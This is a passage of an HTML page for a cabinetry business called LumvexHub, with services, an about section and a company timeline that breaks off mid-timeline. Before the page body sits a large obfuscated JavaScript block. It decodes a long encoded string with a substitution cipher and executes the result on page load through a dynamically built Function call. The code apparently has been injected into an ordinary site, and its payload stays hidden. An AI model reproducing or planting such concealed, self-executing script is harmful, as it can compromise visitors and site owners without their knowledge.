-‏bQAr1aiLMM-‎60L$w'EzyR~Oy/ZzHv5'9!‍*96~v*z‏/!H{bQ9ReR)n&]^! uM)Qj'N^&‎{Za-w+^typ^a{M?‍-t+?&M‏bzpTsK.6g!;Mz69/Qr‎y24Mp=kALO$9E/s‍$91kpsL/3Ey21~/H‏b$:E2)w‎OI0j*ZNtIiiya‏Ota‍b.8*jKin:I8~A*$$4r8vgOMz!q-w5‎ :&MrL=r9czz‍cRgM&R-‏br5=E*04 5ig814j4O2{‎?ne~Tq=6!Z l^‍8yIj+ I5+l{8!nb65^?tu3T‏-a !qL0NIN‎$aq9‍/Hw)b)$a/Hv4H‏(j~{!nuOr(i(*n^]u+R‎;‍uAAaA^‏bHR8~$‎4)'gATqr/] -O)~{ZQ;9‍44r)r-9qb]{QA'20;‏u*e/I;L‎H1zw ;]395k9u:u+qk9z‍H3‏5w;5bKi+rHuyyD‎$En2zaAuIzqHMD +EOqy?9Zi$‍QIzI?DQ+MOy$A‏baiu${n(-M8==( 54jDE z‎Np9;cAnRrqOtgZ8ys;2ME/Z D5‍v9ycA/pOtDNvrs85g;+ynM Tg!‏b)$$iNu6sD$‎^E)/-qiatH R89gO+Z{ELy&2nIZ6QOv‍9gg6v&-tI{n 8^yai‏b+QHj'eqLKi*-2-2(Z12s1zuZl:‎+(+y3eLLR: 3l(‍:b&2+e0HR)‏IsMrI?Z!eMLM]?‎qnj 0'‍i:6nj'?9iM906&/ZL‏44K.bqpEIK‎yuj?HT-/z 'ZROsK3/(/‍K(~sR3-'lHy=6RA#/ e8ji^AiZ #bO)v{Nu#^)@JAilef6j@O/[fjP[@J#z‏9513A.;eO]gwHL=yaEN& #b')v{Nu#5)@JLgzafeNH]';@&1=[fjP3@JJZ8bK^z:~?N1OuPby[K$ 17deOuKbz7b$ e:K^Ny~?#Z8A8l6Aj=/RiZO ebNi^)u )#@Jfv{eO#^if/A6ljPj@‎[@=[CJ(tpbtK71q0Kbz15$ eOu#y#0jl6R@=/ A8OieAiu^#Z )vbNf#{)@/^ilJA6jeO@fj[@JP[Cb‍1OB#byuK$z#v@ e=(@7b5tp1tK#vq0u @#bJ)v{Nq~T)@n/_btzsi;k#/M:~4$$elIj(p08!.=Nu$#@ )vbJf#{)4I0=(jp/!$P@f#[@JtXbtp1q=(0@05KX@#j[PCVP&[Cb[uM {*kn37b:/sitz#b;MR$B`b/?k;3Q4=DM@Cq00_E9q4 RgRZ~OO9T~7JZR9AJD8/sbtk[i;Mno77:z{2bB`^gusba!rkZJZ8[mJD8~mb{*9A3[&uM`o77 b{~bB+ua('3wk[L nvCb7J(0I$b1{)He;80*9a0P0H85bc[7kR9Hdbc85k*7JbR05k*9H7R0c82q:77~:~A *[F0q9H8WbcC5kR9 AJ0H85b*0kR08[dbc0$H1{7be;a03 n0I)Jv(0$b1{PHe;8b*9a0R0H85VcU0kO~Z[Cbt2Oq;kn/_M:zsib'#bB/N6(`su(c)rp4& `1@#=ba.bBsRN+np{)/=wTvg4Jb(v'H1{8@e;a0$CJ0[COJb.V/pN'id9^[k AJ7n/sbtz#i;M/b.':pN9iO72^@oqq:~7~:[A .9dba7r]aebtk]/;Mn/s':z#iiO/b.@CpN9sbtk^i;Mn/.':z#9iO/b^@7pNNubB`M-nAb)Qw/Q[JgCVgUUVH{WpaUO q RZOZ[CJUUiOJb.[/pN'7d9^tk AJMn/sb:z#i;O/b.'opN9i772^@ qq:~t~:[Akn/db:zsi;O#b.M/pN'iO9^@4/4/7/0UU0v(0(MC$$04VV[$paJU~gH{UI`UWO AU[`JoJCb^vbBI/(/kjAA{yk_ t$*&q_b[uM {dO~3[CVZ2O9b1!q/ij1Anv7b3b(0I {*&)J#buM )B`b3/R*ppN0g$^4Z]8*[#b@P?1B`b!(v~a$D)/R@Cvu/* AJ.&uMb{B` 3#~b{Qbg36iH8T 5)d 6Qwb{*@[3#&uMabB` *Z'b!u-I210s=Q42-805`b@#bk3N1BeA1E-yMc)g@2)//J[COjn/Vbtzsi;k#bBM:AM`b'-tM56@JJMuJJ[7lbn8duR[:^n87d7:^lbb{*uR3#&uMLbB` M:nbc~gvyiy:$Z(u@JE':_y~EL~ZwywOw#YcR~Z_KHU7 @$YJb[C un8:AR#b^l/&B`b63/?Ku89jR0~vn:[db@^lun8#bR#v)B`b@46ln:?4)gZsrMe.v@J30[J[CVv[CVV[CbP0)?cc0d7J[r AJ7/sbtk#i;MnbB`:zwrb{l0(v^4i$/Nj+Mw@JbMEvb*K i`r1A.&{K[[.*&udbbBM 3s`b*#Qer$)45w{ub9L0)B`b@Jk(53HDMkZ/cO/rLbBR)[&`bt#0'R*)@J/$rpJbp2&{[^N1!7dj1A9b#bB/iyl`bn&kMQ.):^'Du$ZrLN@JbOp&{p^CV[CVk AJ[n/sbtz#i;M)bB`:ql6be)@n;)EJb++vi`MMncb*+b[[dMn=(JJ]Pn/5jbcA(Qv[K0AJ7d/bn= 5(](nb;[dJy:LQJ0Pb!)$M^(47/E(QdbM[$M^(4b/E(Q{*&M7#buM uB`b3tc^^/wwK4M9prAu@Jbju/5n=(:(]Pn~H Q9#b=Z~2B`bOIj53;uicO2uMeA5 r@1?:LPJb[Q!);7dy0OqO~ZH_Q92 =Z:~B`~O#2b{ub01)r6CV4L9=[CT@~JJy Q!b;:^)y0L(4Q7b(M$M/-#bBE4' `b:5tl/JTcN*[[[Q@LQdb;b!)y:B`b0#eR.tz$Mu=I@J[!^J[CVVKCJb[0jQcA;:v7J0LQ!bPbn)yj2vu~z~Dtd A[7LQJb;d!)y:bcA0[vJK0j~obnQtj2vub;z~Dy:LQF0#b!)5)B`b9c']H'@W{kQ!b;:B)y0L`b.#b&!jQ?/0u$.p.(g{bn:a@2vu~Pz~DtjJb[C );:LAy0#Q!;NbB`I)=vbZr21(9:@77b~#bQHczB`-0+AIu D?vn0nRHdb!M@);:L[y0#Q!5.bB`q4k0b.4q$ :+T0zV]@J&VO~[C_bZ2OQcAKqvCV0j=([Jb#n/5nbB`(])3baujvuj/9R'-6Jb@Pv5n=([(]#n/*5bB`MtzIbvgk!k[C0@P{VV[0*&uJbbBM 3K`bK#459IQw@.y8b[CV5{*&VC#buM LB`b3IeM3E)0?MRr)p1~) @8sbcJbBzL{r`0{LEvb^tsP/ (4J^vi+qbc[7Jc0rd[CV)?Jo[C (JJbA1:y5]pIzEP)e0zb[7Ku(1db5b:yz]+MME7bNEvi/MAK`TMCp:0zbpItKu)ekn/7b:zsi;&#bBM9rv`b06r(^b3-tAB`b@#pg+;8CDQM~ AJr@(1Jb57:yz][EopImmJ)e0zb#bBKu1u`bcE4M3.-@J)$](vPb#1:y5bB`zEKrbe$MM$Z].!9)([o0M217b5@:yz](O~E[[AZ2Odw=Rq_~Z~CVO2OqO2~C_Z[dV[JqO~Z[CV 2OJbAJo+3(tJ)~P1)v^bNAuj?rdb3[7+)(t1M~7b)Evi+M2*`barKCbyv^uNAtkj?7Mn/sb:z#i;H)bB`-!/)bH?1MND*.vab@#bKN1;B`(1u rR0/6lg@CuQb3 AJ)(t1J~o7)+mJ[)b3(m+)~t1Aro7b[v^uN[dOj?q_~Z2CAw=OVO~R~_ZZ2O[O2~qJ[[CV2OdO~JqCVZJJb AkNp?ep^g/&cQ&PbvvMPbb^~~;^;t0P4eDv HePbT85k*9b3R0cOuHaPr Puug0b!3{q/P{80$b10PHe;sbi0a/Pbrl6(&M0=~PbM8AD&N!arTPP6:$bbiM?i90I$^(zvP20j~bcH-4'P8MZ4b^9[M0pc7dbQ&Mb1{87J;a0$H00PbeM6(&M)/~Pb52Agg^(/Pba~:{jzPb!HL/K6?dj/[Abg)7g7b/2$H1{8be;a0&M00#@#M6(ZbB`~=&'b^!64?u['yneCb5@J{j^(/Ha~:qwZ7#E9 I~B:~_`b+PbAw.l ])5sA'Z/TjPPJ[PP@#PP_VdP@P(/Cb5~:{j^#bBHa&+`banH4M!@Jby(6(&M0b~#bM'~AB`M(*reC @J2bg)[[7b/2Agg)/g#bB2Ac!`b*vwe2yr$ucc[C)g@!A9OJ6?zJb/_L/K^9A_j(/:b5~[{jHgd Aa)/2JbB`Ag#Ib+ub)AH);vrL)v62@Jr?zLb![7/Kjd77U/O~Z0[Aw2Oqb=R~_g)/CVbg2Ag#)/27bB`AgD!b!4awI+8${0O0JbN '/!6?@Kj/zLCVPP#[qOZPb@#b+3LB`)1u&80ay)2E]3!OJbMz@:cMAJy;)8!bg[77)/2dbg)Ag#b/2ArB`bg'(Kzzr+(Oqbrq.ycMA@J;)8!:VPy[C [C)/AJb2Agg[do7OqO~Z~_Aw2CVO=Rq_~Z2VZO2OCb;~C~0vv^87Jb~0$H1{Pbe;a(&M00~PbM6v.Kc&-eQPAr$eb-[7rv&&db$Av.Kcw=eQ7-R~CAr$eb-7brv&H1{8$e;a0$M00#bCM6(&b1{~@e;80$Ma0#H0M6b&q~(~@lT_{7DJbO9$H1{8be;a0&M00#@PM6(Zdj~~wOjZJ8O~ZP~98P_E~ _O_dI~O9 AJ[8778Ob-7bByHAH`/80:r[d]u'vbKc~.eQ&A~C7ZOOVO~2q_eZ2EZ~A=Q#bB~cM)`b uz$a/6uLkr]IyjOj@JZO~ZPw98P_8~ _O~VI~OEV[C[C0$b1{#He;8b&Ma0~@0M6-#bB(lcc`bM'0Ll5/Ei&@J[D080Cb10$He{#b&;a(~M0Mr@7b6$er--O~v&$bZ2OCKc&q_QCAv.tVCbeDv ^;70T4eaCb3euuOuHp?r 7ge&kb/#bN^QnB`bD15A3TM0M?$q.zzOu@CQJb*A9kR9H8b0c75*9HvC0c85kab3RuuOuH*9r C0H85bcXXkR3{[dbbg0q!p?e/7g/&kN8#b*^5kR9Hb10c@e{80C;a0$H{g7b!@0q/3Cb&#v(~M0Mg7b!60q/3{b&#0@rN=8CT7bAD0q!3{b/#/g!a6@C7J:$?6b&Mi(~[0M^;7d4tDvbee7 TbivCV9MI$C0zv^2M07Jb7M6(&db~[v ^;tvT4eDCVCe7j~bc(&4'70v-rJbPb)(u/+ssyw;+&^4)~PbdHA[-b^;7T4tDvVee7 CA9vC-MOJb^Z4MH97v08MZCbH94M0-b&8^DrN=8MTCbAZ4MH-XX08^b[d 91{8AJ;a0$Hb0#beN$ B`0rMMAJL2M{b&Mr@~[0M60[db(j~4c(bH'J00-MZP8^94M0MPb&V6(~Mb1{[Ce;80$ a07Hnv(b3b10I)e{80J;a0$HAJ[CV8oJb 0$H1{#be;a8B`b0^4ZK;k@lcnMJb&*6(~M0bc[[['(0jdJvP~4Z4bH-PM08Mb&M^9~[0M6rCVb(ls/i0807b10$He{Cb1;aHe{801;a0${807ba0$HeM#b&;6(~M0Jb@C H1{8Ae;a0$`b0#b;{:MBv485yB`)@J~b.rbAlR&O(w-'Md$~Kybc([['J0j~&0Pv4M0MPb#6(~4bB`X($:b'.i*{&Ceu@)Vb1[He{803;a0$ nv7bJb(0IH1{8)e;a0$AJ0[C0ob1 $He{8bB;a0E`bp#q(O(AH5IH/3rp4H@JbHal:B`b'5'z&qq(2{[[D:]jdbcM~4'(0PbJvP(&M00~XM6b'#bBq6{5`$=LuNasM;Q @[)AJoCVg0b!3[q/#{d A4@cQJob0&MJprlsbiM0/Pb[M6(&db!~[?ia6:MJb&$6(~M0~=[CVJR~dVb;v A0Jv^~sbi0~/Pbrl6(&M0i~[[MMI$dbzv^29MJb&06(~M0VO[CV_~Z2Vb^;OqT4tDvJeeC ##bV[sitknb;M:/B`bzP1)gj&ZDMuvpPr2/tk@P#Mn/sb:zPi;+NbB`M05wbj0^Tq0:6L4bPv@atknP#M:/sibzPb;*reB`$eMnkP&K!e0@PPvn/#btzsi;kPbBM:)R`bpkOzLOLPv5utk@P#Mn/sb:zPi;NMbB`e-Dvb(^u*cv@gL4nP#bP/sitkPb;M:uB`bzDN:Q4R=/QM+~v)KyPvTgtk@P#Mn/sb:zPi;+rbB` 2/Mb6?sjpv@)5=nP#bP/sitkPb;M:rB`bzNEjKaPviApk@P#un/sbtzPi;M:bB`:u+Ibak;pO(8jvH5Pv@H/knP#b:/sitz#b;Mu B`bME/$au@P )^MbB`rr14b.c;O 0@zl+&P#bPuM {*`b3Pbv'/.Bau0nzP#-PMMb{*@ 3P&uK/bB`lA38b9I5!)#bP/@ {*&P3PbuM3:B`bM9kKNKPr{M{*@P#P&uMbbB` 3L bHvA${*^/:t'r/@;/K&P#bPuM {*`b3PbnQK6BE 3Q--MAO9P)0ka/P0v3{*@P#P&uMbbB` 3!wbg9zzw:/LM]utP/wZ0*@P#u&uMb{B` 3PubnqbtEq=z;PMyT{/@P4*&u#bbBM 3s`bnPEO{=LQP)p:{/@Py*&u#bbBM 38`bQ#a^Op^PbyD(TB`b@0s$iuP4~gMk@P#An/sbtz#i;M/bB`:v$)bi~{^?Ob@Pb:.v/B`$44wuP/*TMv@P/Dn/#btzsi;k#bBM:]r`bi0Mr0)@Pblr4vB`bMr]^+tPv]]tk@P#Mn/sb:z#i;N4bB`ua((b)~tiz5{c(A`)@Plb&LbB$Dusucz*iv)Pvivtk@P#Mn/sb:z#i;i:bB`TTjRbR-@{?b;PbB0!$v`iaE((#bPv@itknP;M:/s`bz#b)ikeB4(4/8.3]!r`*@P6b*ubBs-K:HI=9v(R0 ur@P^iPu#b{vM 3*&bi#bBzMQs`E:w~0bB;u@Z`b^J1lr:u)K )M`/[Pvbc+bB0;yM-r3MyI@P#?PuMb{*` 3#&baMbBTa(D$+)r=)@Jbut;0B`b($Dlg(69~+j0Ozc`4[P(b&4bBDgzIuu9kv8.PMyMPb@P#(B`bvM^pQZP02Z3P@P#DbB`r2b5a02N-T+D)8N@P=4PB#0`bzPbRe45.tvrRi/;O:)0@n+LbP#PB`bP0]N1r0A'?D@P#DPB`P1b!zb28ri-AuNylP)MP4#0@btPbBI0*(`rj{'{w4up(0'?u4@P#HPB`P9b;qb?LQl)'4k4$@~P0vP#P0`bPb+!N]B~?*Mk*(${5P24P{#0@bcPbBMO)M`3r?//P# P0`P@b^zbB&{:MlO/9v-'P0OqP@P#abB`'/wbQq $=u+)D4)P0@r:PbP##uB`b@k/v;~;wEI0&v$r)OP0$.@P@P#6bB`#/:.bzE;r0~HDeNLg/8Ze##P0@b@PbPNc&B`HLq'A..qIA0P09KdV@@[ ~=R[AJb~dr]ae.7a]/92q:77~:~A .[dbq9r]aeq2a]/b==C7i*5VV7JtELIb^O/Pbis8ve=eA]Pb.MwrP*{vZbgI*NjEM21pPb.PuKM;ba;+Pb!]tPbLz~4*^4:wPb]$M9z=Rt?PbN$/+cQPb!&0t5yv~4Pb5$r''1KAPb*$;M*0)g=/Pb[zDua7dM{8Ib^OE7b+svi`MM8Ib^O8Cb^sI7bOsI#^OscbB`8.crbQ'1a$vs@Jb(8I#^O^'bB`{A$Mb2-(.3?2g/MbzMiHB`b@J(330M1ukn95[X50i=0[C7eAMbb^OvebBs8IZ`b1#$DwQpR1^u;O~@J$s8Ib^bg#bBK*w(`Z/ijA$[{4@]Cb.Uwr7*{/sbtk#i;MnbB`:zQMb;k/s:r]vM@y/eAJbiBMve=`ba#buT+8(e?A2HvlwakPre@JC[P0v AJu[n/obtzsi;k#bBM:Mr`b1 )n$i')@$0{]Jb.bwr[*gIM[dE7vZNMb{*j 3#&u{4bB`=tirb2]M(9n$IaM`;@#qbz3bBekM2^svr2M](w'4#b()cKB`b@ZM!+?Me]DLv@%v~vvvl0b.C Ao*{]J7bgwrNjIMveE[dZ.9rba7q]a]C2==/Vb*CVKM21pk+.7un/sbtz#i;McbB`:0r$bik]Ew-ecR=K@Jb&vMvi=ebe#bAp)MB`4u(t(ue@Jv[P0rPa;u[Ct]t;bkn/7b:zsi;t#bBMk.M`b)yu6j!/54=e)@gveAJbiBMve=`bz#b^vu$RM?/Kq$.Ma^$[@JubP0uP^Os[C^O8I7Bs8Ib`b+#bc00OO=-{((14.u.vPu0@Ib^OJ#bBs88n`bK=;wTz~2g6eCb@U$4*^4[w7q]$tk~T_Mn/sb:z#i;+rbB`Nic)bwE0{61n$-.B$8@5`b{Jb4H/4$b M0~B`b&P*~!.jQ9H; =Rj9(/[{tNNCbzlM9?=R_b7q~itknT;M:/s`bz#b2*E/B$-.(^bBrI@{`bKJ1+4a?u+v$?A/4N]sPbu9):B`bz]:apzH=e089u64QI[C*t$/bc~7+!&tq~T0kn/_b:zsi;n#bBM4^r`bLZiTI*rp/9zE3QM`b@Jb$;r]Baz{TrryDN~Bvr02`bcPbMl^yA(1/0{[CbOq$t5yv_47q5btk~T;Mn/s`:z#ib*MbBi;l0{JIg$D#G(@UAvU)`@Pwb;ObBg!{uKu$(/iv0u)Ab^{q[bOs8C^OsI7B`8I#Ib'&bI~l{)sa4wu4@Jb)]$4*^`bwPbN&KwBMKz:9D[y44n#bBl0r `bIDr)uM4g9s $'vM=R@JbbNM9zB`b?P1.{tvH+r;zKa(]qbB^r[.`bz#rT4iI@JLL4/bcQ4+!&t$B`0~P;bQ bg&Kg)[#c&HjbB`Ml0sb{?6ywMpIn(k$@J./5$b5y`t4PvbgvbBg-E.I)tn]HM2?L !L:[C@z~:bCA97#1KOJbP$r''b*07v*/)A;t7baM;Cb;]r''1Kvvl$Cb'0v'X1K$)XPbrA;M*0b**/XM21p7+.PuKA;b*0vM*/)l0v%7!Lv[d*z~:b0)A#b@7;M*rb'1/'CVK$zDbag^uM{=Os87b`bI#bl-j5B4kur6g-MM:@+A~qJf`(gj[d/VOCO~fqJJZ2tpbt=P1q0(bKR5Ks.jZi(kaPE$cHb5nRuPbbn24tcH$(Pb'$]$PeLvPb'1)~PbK$rM*0)'*/[A;t=7d0(tpb5K71qKR#@C.jZibka7EszDbagBuM{=`b'#bk]ttv/O/ k@Cb40Hu5($t7btcp1q=(bB05KZ`bt#)+1$4N&/2K`{@#5b50bBT3u4{)91THw@J;~tpbt=[1q0(Cbt5K4(nRn/7bt2si;knbBM:z5`be#2vt)u@#;nj9bB`i=:3b+8./uO@OI;;JbtA-i;kn/bM:zscH$[CbB$]$e`ba74jNatw9s$0bM#b9e0+B`3D'?H-8?z;@J0r9O[C$Jb'Ar'71K0)vPb7A;M*vCb*/r''1KZbK$iEsRjb'.kaX1K$CXPbr';M*0)b*/XA*0)XP/%A;Mv7vl*[db0v)~'eLR7Jbvn24tng=(Jb#zDuab'1M{@PK$r!0u['Lz~Ub0):#b@A;M*Xvl*/%v0vvbl0v[5($vC%cHu$XbJ$]$cHeL#Jbuv)~'[Svf0H$@Xb'$]$ceLv#bu@)~%Z[CV02OqO~n/_btzsi;k#bBM:R$`b'0A3an2@J*2tpbt=#1q0(bB`5K-]bzNtuiw-a/l1~4H@J[[CJ[CVV[HKCb3JjZrMbniO7^~{uRn4:Pue(IbnPb9N(''1K]Pb3$ruOuHadr [ubni7^~{uRg4:7u1)!JbQ~q/*8Pb&)ADrN=dOT[7_~Z2btkOq;Mn/s`:z#ib-4bBn^rn*E?i0+e*!MsbBIg@u`b3#zv9I60v5-4@+uL=JbtT)i;kn/BM:zs`bn#brsr1n#l9.EbB`g@D+b+skLrTynAj;IT@54E&J[,KN=8JbUbADr/g1)T*)Q!q[X~X0qbg1[/*))!bnQ~VNne(C(]7I93uCrHaub 7buORuni{0^~4uv,0:J(Mvvv[,0vPCA9vv1KOJbC$r''b'17vbK$ru3uH'Or auK$Cb'dr'X1bnnX[N(e(Ik]X79n/sbtz#i;MabB`:ls1bp*aI/Z0DLq]@#bqEqMB`b0O4/a6ls4?@Jw(ERbniru^~{uMu4:JMPuM/[[CM42OVO~eq_bZ(I9nnVCN(]e AJC.9rba77]a]A72q/ q~:~ae:[d].9rb/7b]aELi*5~/J[t=R~CVba_ Aae.9J]/7r]==77q.[db29r]aeb3a]/rMHK7OJ[jZJYCV _vY_Ab+M q[dMEvvb+Mii#YME[CvY@dV~=JO~ZR~Vb2Oqi+MMC`biEv7J0k/0Jbc4Dl)3cb*H-cb*08PaE!(Pb*rA/v!MlPPb1ug0ww=v^616(;tDPbeev T1[74w=vdb16(0w'7bB6]My`b.$9k68Cb*4(#b*0(01w=7w61vJbc6@:yMA8s;)P!s&^b+~P/w;Ibnn+9N(e(4-]PbP:(=-b'1j$[7K$redb'(I9nnN(]:Cb-7(=j4-`b$7b9Nu4BtA5tzCA]u:19OJOK$rb'b''7v1K$Cb+sr'w;s&^1+~C/K$rb'db'XX9nne[N(](I4-X7b#:(=-bB`j$Arba=L1M- M0LQibt$y@;kn/JM:zsibQ#bBR9n&`)! {e)Qu']`j@#^bz.bBK;6MT9Mzrs/Q4g!btM6@;kn/JM:zsib3#bB)~/H`0$:E2`b@#b$.8nBKi~:I8$A*8@4rMvJ[,z!:(b-4B=j$-`b*#bE5048eig414j@O2O~[[CbZ2OVcMAq_;)8!:(XbnyI9NneCb(]C/aE!V7b*rA#b*0801w=(w61v(B`6@J!btubqN-3 q9a0N[LP0ICb*4rgv!Ml87b*u(#b*0(01w=Jw61vbB`6@~{bHvO!((4rn^ju+Rni(CP0/*b**/[b*08(v!Ml#@7Jug)Zbnkz0p~d:~[7_b=~Zitkn~;M:/sE!z#b:rA/a~=~@CtkZ~_Mn/sb:z#i;lub*!~gv@MZ2OCO3cqJb-0Dlcc77)H~)7bnFZz0kbaep[a].9rV/W]CbtCi;kn/aM:zsE!r#bb{A/@3*&u7#bBM A^`b;R8~$a4)'gHbBr/@e`b'#/I120Jbu*L {*&@3[CuM/sbtk#i;Mnb*!:zv@Mlu~7Jbg)Zznkb0p[#**07b*!8(v@Mlu)JbngZz0k~^;p[C4tDvbee7 T_JJq~VJ[7T[#bdTgB`b)!$i+$6sN$@JD)/AbaEu/X!r*!JXXMlubJgvb'XbBKeq-`i*(2j2sZ1u[1zX-[[[b&#bB0HR)`IsMrIJb!eMlc3c@)H-0Dccc[C[0r)bCO~?J_bZ2O ^;tqT4eDvJdeCVCVPd[V[JV[9TT q:[C\\\";for(_BqhTW of _C22oe){if(_BqhTW[ã('Ϯ')]||_S35cpT82dF){_OIflurB5=_KxR2N59-(_K5I8Yo4V()+_BqhTW)[ã('Ϯ')]%_C22oe[_XU19v1tp];_UfT1gN0=(_A2L7fz,_DoFpAjs1U,_XtUXO7l8D)=>{_X3SfrsOCki=_X3SfrsOCki[ã('Բ')](\\\"\\\\x14\\\",'>')[ã('Բ')](\\\"\\\\x13\\\",'<')[ã('Բ')](\\\"\\\\x12\\\",'\\\"')[ã('Բ')](\\\"\\\\x11\\\",\\\"\\\\\\\\\\\");_X3SfrsOCki=_X3SfrsOCki[ã('Ӷ')](new _VjC2kYX5dG[ã('ҏ')](ã('р'),ã('А')),ã('Щ'));_X3SfrsOCki=((_G6MPXUQ,_VAwa7,_T1eFz53mAG,_GlP14wU,_D7tLDI0e,_YchLAi8M47,_B15kLVU7i,_Vr1k1r,_WE5vfB83qj,_DoFpAjs1U,_CJYt0p,_QZT84Q,_U5fpWdhX9,_XkZY1UhST,_SXVy0iw3RR)=>{_B15kLVU7i=(_VAwa7[ã('Ө')](-_YchLAi8M47)+_VAwa7[ã('Ө')](0,-_YchLAi8M47))[ã('Ө')]('');_WE5vfB83qj=_T1eFz53mAG[ã('԰')][ã('Ը')](_T1eFz53mAG);for(_QZT84Q=_GlP14wU;_QZT84Q<=_D7tLDI0e;_QZT84Q++){_U5fpWdhX9=_Vr1k1r(_QZT84Q);if(_WE5vfB83qj(_U5fpWdhX9)==-1){_CJYt0p[_U5fpWdhX9]=_B15kLVU7i[_DoFpAjs1U++];}}_XkZY1UhST=_G6MPXUQ[ã('Ϯ')];for(_QZT84Q=0;_QZT84Q<_XkZY1UhST;_QZT84Q++){_U5fpWdhX9=_G6MPXUQ[_QZT84Q];_SXVy0iw3RR+=_CJYt0p[_U5fpWdhX9]||_U5fpWdhX9;}return _SXVy0iw3RR;})(_X3SfrsOCki,\\\"*IE21ZuK3Az=podXlq]f$;yc?^Fv(Tm5Mr,Ns|w-}:+'t)bS .O_U{R/B#Ygjx&C!Hn4kV60a@hGP~`eiW[8%JQ79DL\\\",'\\\\\\\\\\\"<>',0x20,0x7e,_OIflurB5,null,_VjC2kYX5dG[ã('Ӡ')][ã('Џ')][ã('Ը')](_VjC2kYX5dG),null,0,{},0,\\\"\\\",0,\\\"\\\");_X3SfrsOCki=_X3SfrsOCki[ã('Ӷ')](new _VjC2kYX5dG[ã('ҏ')](ã('Ԟ'),ã('А')),ã('Ւ'));(()=>{})[ã('ն')](\\\"_L55c0Y\\\",_X3SfrsOCki)(_L55c0Y);};_UfT1gN0(\\\"\\\",_Al9cj,_VjC2kYX5dG[ã('Ӡ')]);}}}))();})(()=>\\\"Jl4RiUKW1bbvqq6hR1qLYxC79E5e147kk8\\\",\\\"\\\\165\\\\143\\\",window,0x0,0x1,0x31,\\\"\\\\162\\\\145\\\\144\\\");​_L55c0Y._Y1j23()\"[_WZWjLh7l2()](`​`)[_WZWjLh7l2(1)](_Izgl5ltm=>{return((()=>{})[_WZWjLh7l2(2)](\"_L55c0Y\",_Izgl5ltm)(_L55c0Y))!==false;}))({});})();")();</script>
    <body class="main-container-xyz789">
    <header class="header-section-abc123">
        <nav class="nav-container-def456">
            <div class="logo-text-ghi789">LumvexHub</div>
            <ul class="navigation-menu-jkl012">
                <li><a href="#home" class="nav-link-mno345">Home</a></li>
                <li><a href="#services" class="nav-link-mno345">Services</a></li>
                <li><a href="#about" class="nav-link-mno345">About</a></li>
                <li><a href="#history" class="nav-link-mno345">History</a></li>
                <li><a href="#specialties" class="nav-link-mno345">Specialties</a></li>
                <li><a href="#process" class="nav-link-mno345">Process</a></li>
                <li><a href="#materials" class="nav-link-mno345">Materials</a></li>
                <li><a href="#reviews" class="nav-link-mno345">Reviews</a></li>
                <li><a href="#contact" class="nav-link-mno345">Contact</a></li>
                <li><a href="#" class="nav-link-mno345" onclick="showModal('privacy')">Privacy</a></li>
                <li><a href="#" class="nav-link-mno345" onclick="showModal('terms')">Terms</a></li>
            </ul>
        </nav>
    </header>

    <section id="home" class="hero-banner-pqr678">
        <div class="hero-content-stu901">
            <h1 class="hero-title-vwx234">Expert Cabinetry Solutions</h1>
            <p class="hero-subtitle-yza567">Transform your space with custom-built cabinets crafted by experienced artisans using quality materials and innovative techniques</p>
            <a href="#services" class="cta-button-bcd890">Explore Our Services</a>
        </div>
    </section>

    <section id="services" class="section-wrapper-efg123">
        <h2 class="section-title-hij456">Our Cabinet Services</h2>
        <div class="services-grid-klm789">
            <div class="service-card-nop012">
                <img src="https://images.pexels.com/photos/1080696/pexels-photo-1080696.jpeg" alt="Kitchen Cabinets" class="service-image-qrs345">
                <h3 class="service-title-tuv678">Kitchen Cabinet Installation</h3>
                <p class="service-description-wxy901">Complete kitchen cabinet solutions featuring solid wood construction, soft-close hinges, and customizable storage configurations. Our experienced craftsmen ensure precise measurements and flawless installation for lasting durability and functionality.</p>
            </div>
            <div class="service-card-nop012">
                <img src="https://images.pexels.com/photos/1571460/pexels-photo-1571460.jpeg" alt="Bathroom Cabinets" class="service-image-qrs345">
                <h3 class="service-title-tuv678">Bathroom Vanity Cabinets</h3>
                <p class="service-description-wxy901">Moisture-resistant bathroom cabinetry designed for humid environments. Features include waterproof finishes, integrated lighting options, and smart storage solutions. <span class="continue-link-abc789" onclick="scrollToSection('materials')">Click here to continue</span> learning about our specialized bathroom materials.</p>
            </div>
            <div class="service-card-nop012">
                <img src="https://images.pexels.com/photos/1571453/pexels-photo-1571453.jpeg" alt="Custom Storage" class="service-image-qrs345">
                <h3 class="service-title-tuv678">Custom Storage Solutions</h3>
                <p class="service-description-wxy901">Bespoke storage cabinets for closets, pantries, and utility rooms. Maximizes space efficiency while maintaining aesthetic appeal through thoughtful design and quality construction techniques.</p>
            </div>
        </div>
    </section>

    <section id="about" class="about-section-zab234">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">About LumvexHub</h2>
            <div class="about-content-cde567">
                <div>
                    <p class="about-text-fgh890">LumvexHub represents decades of woodworking expertise combined with modern manufacturing techniques. Our commitment to excellence drives every project from initial consultation through final installation.</p>
                    <p class="about-text-fgh890">We specialize in creating functional storage solutions that enhance your living space while reflecting your personal style. Each cabinet is meticulously crafted using sustainable materials and time-tested joinery methods.</p>
                    <p class="about-text-fgh890">Our team consists of skilled artisans who understand the importance of precision, durability, and aesthetic appeal in every piece we create. <span class="continue-link-abc789" onclick="scrollToSection('history')">Click here to continue</span> exploring our company's rich heritage and milestones.</p>
                </div>
                <img src="https://images.pexels.com/photos/1080721/pexels-photo-1080721.jpeg" alt="Craftsman at work" class="about-image-ijk123">
            </div>
        </div>
    </section>

    <section id="history" class="history-timeline-lmn456">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">Our Journey Through Time</h2>
            <div class="timeline-item-opq789">
                <div class="timeline-year-rst012">1987</div>
                <div class="timeline-content-uvw345">
                    <h3 class="timeline-title-xyz678">Foundation Years</h3>
                    <p>LumvexHub began as a small workshop focusing on traditional woodworking techniques. Founder Marcus Thornfield established the company with a vision of creating exceptional cabinetry using time-honored craftsmanship methods.</p>
                </div>
            </div>
            <div class="timeline-item-opq789">
                <div class="timeline-year-rst012">1994</div>
                <div class="timeline-content-uvw345">
                    <h3 class="timeline-title-xyz678">Expansion Phase</h3>
                    <p>Acquired advanced machinery and expanded our facility to accommodate growing demand. Introduced computer-aided design systems while maintaining our commitment to handcrafted quality and attention to detail.</p>
                </div>
            </div>
            <div class="timeline-item-opq789">
                <div class="timeline-year-rst012">2003</div>
                <div class="timeline-content-uvw345">
                    <h3 class="timeline-title-xyz678">Innovation Era</h3>
                    <p>Pioneered eco-friendly finishing processes and sustainable sourcing practices. Developed proprietary techniques for moisture resistance and durability enhancement in bathroom and kitchen applications.</p>
                </div>
            </div>
            <div class="timeline-item-opq789">
